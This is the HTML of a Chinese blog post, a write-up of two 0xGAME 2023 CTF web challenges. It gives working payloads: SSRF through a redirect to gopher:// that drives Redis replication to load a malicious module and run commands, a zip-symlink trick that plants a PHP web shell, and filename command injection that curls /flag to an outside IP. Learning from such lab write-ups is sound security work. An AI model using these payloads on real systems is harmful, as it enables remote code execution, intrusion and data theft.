@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jednersaous">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Writeup for 0xgame2023">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xgame2023 Writeup">
+<meta property="og:url" content="http://example.com/2023/12/07/0xGAME/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Writeup for 0xgame2023">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/writeup.png">
+<meta property="article:published_time" content="2023-12-07T02:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-01T07:17:10.706Z">
+<meta property="article:author" content="Jednersaous">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/writeup.png">
+  
+  
+  
+  <title>0xgame2023 Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Hello, it&#39;s jednersaous</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0xgame2023 Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-07 10:00" pubdate>
+          2023年12月7日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">0xgame2023 Writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0xGAME"><a href="#0xGAME" class="headerlink" title="0xGAME"></a>0xGAME</h2><h3 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h3><h4 id="web-snapshot"><a href="#web-snapshot" class="headerlink" title="web_snapshot"></a>web_snapshot</h4><p>好题目，学习一下</p>
+<p>首先传入的URL有<code>http:// or https://</code>的正则匹配，所以一般来说伪协议<code>file://, gopher://</code>都不能直接传入，那么似乎就没办法很愉快的ssrf了，然而这个时候就得回去仔细看看源码是不是有遗漏的东西</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br><span class="hljs-number">2</span>     <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-number">3</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-number">4</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-number">5</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-number">6</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br><span class="hljs-number">7</span>     <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-number">8</span>     <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-number">9</span>     <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-number">10</span> &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到<code>curl</code>这个老熟人是我们感兴趣的，注意第5行，设置了<code>CURLOPT_FOLLOWLOCATION</code>为True</p>
+<p>查Manual可知，这是容许<code>curl</code>请求URL的时候进行重定向的方法，那么重定向就可以使用伪协议，接着PoC一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://www.baidu.com&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在vps执行<code>php -S 0.0.0.0:52000</code>，等于是用php起一个http-server</p>
+<p>上面这个实例直接用http访问就可以发现重定向到了百度，所以用<code>header</code>是可以修改响应头的</p>
+<p>疑似得加<code>?&gt;</code>不然重定向就会失败，接下来试一下伪协议的读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: file:///Jex/server/1.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>不知道为什么用<code>curl_exec</code>读不了，不重定向的话是可以读的，重定向就读不出来了（（</p>
+<p>用http访问的话还是能看到响应头Location变成<code>file:///Jex/server/1.txt</code>的，状态码也是302</p>
+<p>先放一边，只是读不到特定的数据但是访问状态码还是302</p>
+<p>接着就是ssrf+redis主从复制组合拳的内容了，看writeup都踩了不少坑，是我理解能力问题了</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></p>
+<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/">redis 主从复制 RCE</a></p>
+</blockquote>
+<p>实际上redis主从复制的原理就是主从之间数据的同步，一般是通过命令将靶机作为攻击机的<code>slave</code></p>
+<p>获取其中的数据或者写入恶意<code>.so</code>文件（攻击机上有<code>.so</code>）并加载模块实现RCE，这里贴几个exp</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">Redis Rogue Server</a> :redis-rogue-server.py</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">Redis Rogue Server</a> :redis-master.py</p>
+</blockquote>
+<p>首先判断我们没办法直接连接redis然后再客户端进行操作，所以需要根据可传入的信息进行SSRF</p>
+<p>那么可以传入的也就只有<code>curl</code>的URL了，仅有的http协议没有什么作用，所以需要用伪协议扩大攻击面</p>
+<p>正好可以通过<code>gopher://或者dict://</code>伪协议进行redis主从复制RCE，所以用这个办法打redis</p>
+<p>首先我们要明确<code>gopher://</code>可以发送HTTP数据包，那么就可以利用<code>gopher://</code>来向redis进行通信</p>
+<p>但是得注意<code>gopher://</code>有几个小坑，接下来我会一一列举一下，具体可参考</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a></p>
+</blockquote>
+<ul>
+<li>必须固定格式<code>gopher://url/_\&lt;payload&gt;</code>，gopher会忽略接收到url后的第一个字符，所以要用下划线占位</li>
+<li>问号（？）需要转码为URL编码，也就是%3f</li>
+<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li>
+<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束</li>
+</ul>
+<p>那么该如何利用<code>gopher://</code>呢？首先我们要对redis会把传给它的HTTP数据包每一行都当做命令来执行，详见</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Trying to hack Redis via HTTP requests</a></p>
+</blockquote>
+<p>由此我们便能通过<code>gopher://</code>来控制redis跑我们想要它执行的命令（例如<code>slaveof</code>），那么接下来就讲一下过程</p>
+<h5 id="Make-use-of-it"><a href="#Make-use-of-it" class="headerlink" title="Make use of it"></a>Make use of it</h5><p>首先生成一下跑命令用的payload，套用X1r0z的脚本跑一下，修改一下某些参数，这里贴一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#URL编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):<br>    enc_data = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:<br>            enc_data += <span class="hljs-string">&#x27;%0&#x27;</span> + h.upper()<br>        <span class="hljs-keyword">else</span>:<br>            enc_data += <span class="hljs-string">&#x27;%&#x27;</span> + h.upper()<br>    <span class="hljs-keyword">return</span> enc_data<br><br><span class="hljs-comment">#gopher_payload生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):<br><br>    redis_payload = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        arg_num = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&#x27; &#x27;</span>)))<br>        redis_payload += arg_num + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>            arg_len = <span class="hljs-string">&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))<br>            redis_payload += arg_len + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>            redis_payload += j + <span class="hljs-string">&#x27;\r\n&#x27;</span><br><br>    gopher_payload = <span class="hljs-string">&#x27;gopher://db:6379/_&#x27;</span> + urlencode(redis_payload)<br>    <span class="hljs-keyword">return</span> gopher_payload<br><br><span class="hljs-comment">#主从复制</span><br>payload1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">slaveof 8.140.253.18 51997</span><br><span class="hljs-string">config set dir /tmp</span><br><span class="hljs-string">config set dbfilename exp.so</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#执行RCE</span><br>payload2 = <span class="hljs-string">&#x27;&#x27;&#x27;slaveof no one</span><br><span class="hljs-string">module load /tmp/exp.so</span><br><span class="hljs-string">system.exec &#x27;env&#x27;</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(gen_payload(payload1))<br><span class="hljs-built_in">print</span>(gen_payload(payload2))<br></code></pre></td></tr></table></figure>
+
+<p>以后碰到SSRF+redis主从复制也可以套用的（等着什么时候做个汇总</p>
+<p>拿到payload以后，由于需要让<code>curl</code>通过<code>http重定向到gopher</code>，所以在vps上开个php服务，记得端口不要和payload的端口一致，待会还要用<code>redis-rogue-server.py</code>监听payload端口的</p>
+<p>先写php文件实现重定向，然后shell上开服务</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%31%32%0D%0A%38%2E%31%34%30%2E%32%35%33%2E%31%38%0D%0A%24%35%0D%0A%35%31%39%39%37%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">#1.php</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: gopher://db:6379/_%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">#2.php</span><br></code></pre></td></tr></table></figure>
+
+<p>在当前文件夹下执行<code>php -S 0.0.0.0:52000</code>，可以试着用浏览器自己访问一下是否修改了请求头</p>
+<p>然后注意，要加载<code>.so</code>恶意文件的话，你master下面肯定得有对不对，所以还得先<code>git clone</code>一下</p>
+<p>并且看到生成payload的<code>exp.so</code>文件放在<code>/tmp</code>目录下，所以得在<code>/tmp</code>下克隆，用哪个其实都是可以的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/Dliv3/redis-rogue-server.git<br></code></pre></td></tr></table></figure>
+
+<p>另起一个vps窗口，进入<code>/tmp</code>目录复制仓库后，照redis-rogue-server.py&#96;的help开一下监听，这里是被动连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --lport 51997 --server-only<br></code></pre></td></tr></table></figure>
+
+<p>记得<code>lport</code>的端口要和payload的端口一致</p>
+<p>至于我踩的坑那就是我用nc去监听了，结果一直卡在PING就毫无响应，实际上这样是没法调用<code>.so</code>的</p>
+<p>——————————————————————————————————————————————————</p>
+<h4 id="zip-manager"><a href="#zip-manager" class="headerlink" title="zip_manager"></a>zip_manager</h4><p>这个也学习一下，关于<code>zip</code>软链接的使用，如果使用<code>unzip</code>命令解压缩压缩文件的话就会引起这个问题</p>
+<p>当你通过<code>ln</code>命令将一个目录和一个路径关联起来，那么对这个目录的操作都会指向关联的那个路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s / test<br></code></pre></td></tr></table></figure>
+
+<p>这就代表<code>test</code>指向了<code>/</code>目录，用<code>ls -liah</code>能看到<code>test -&gt; /</code>这样的信息，所以我们只需要对<code>test</code>进行压缩</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">zip -y test.zip ./test<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-y:保留软连接压缩</span><br></code></pre></td></tr></table></figure>
+
+<p>这样解压出的<code>test</code>的读或者写都会表示在<code>/</code>下的读或者写，如果说解压缩但是没有回显给你，那么可以考虑写马</p>
+<p>只需要添加一步操作，在同名<code>test</code>目录（可以不是这个test目录）下写一个一句话木马，然后再压缩一遍</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./test;echo &quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot; &gt; cmd.php;cd ..<br>zip -y test1.zip ./test<br></code></pre></td></tr></table></figure>
+
+<p>第一次先传入<code>test.zip</code>，解压缩出来的<code>test</code>会指向根目录；第二次再传<code>test1.zip</code>，解压出的test会覆盖原来的<code>test</code>，但是软链接的属性仍然还在，所以会把<code>cmd.php</code>写入根目录，或者直接一步完成（如果题目条件可观</p>
+<p>题解里还有拼接命令RCE，这里也贴一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/unzip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unzip</span>():<br>    f = request.files.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f.filename.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    user_dir = os.path.join(<span class="hljs-string">&#x27;./uploads&#x27;</span>, md5(request.remote_addr))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(user_dir):<br>        os.mkdir(user_dir)<br><br>    zip_path = os.path.join(user_dir, f.filename)<br>    dest_path = os.path.join(user_dir, f.filename[:-<span class="hljs-number">4</span>])<br>    f.save(zip_path)<br><br>    os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>可以看到<code>os.system</code>执行了系统命令，而且通过格式化字符串拼接了可传入的参数，那么这里就文章可做了</p>
+<p>我们知道linux命令如果用分号隔开是可以一行执行多条命令的，所以我们只需要满足后缀为<code>.zip</code>，在中间写入我们想要执行的命令，并用分号隔开就可以了，但是因为没有回显，所以考虑<code>curl</code>外带出flag</p>
+<p>但是得用base64编码过后echo发包（埋个坑），如果用初始<code>curl</code>发包的话会500_status</p>
+<p>burp抓<code>/unzip</code>路由下的包，修改<code>filename</code>如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">test.zip;curl 8.140.253.18:51996 -T /flag;1.zip<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">base64</span>编码过后<span class="hljs-built_in">echo</span>发包</span><br>test.zip;echo Y3VybCA4LjE0MC4yNTMuMTg6NTE5OTYgLVQgL2ZsYWc=|base64 -d|bash;1.zip<br></code></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h3>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/writeup/" class="print-no-link">#writeup</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0xgame2023 Writeup</div>
+      <div>http://example.com/2023/12/07/0xGAME/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jednersaous</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/01/BUUOJ%E5%88%B7%E9%A2%98/" title="BUUCTF Practice">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF Practice</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/06/NewstarCTF2023/" title="NewstarCTF2023 Writeup">
+                        <span class="hidden-mobile">NewstarCTF2023 Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
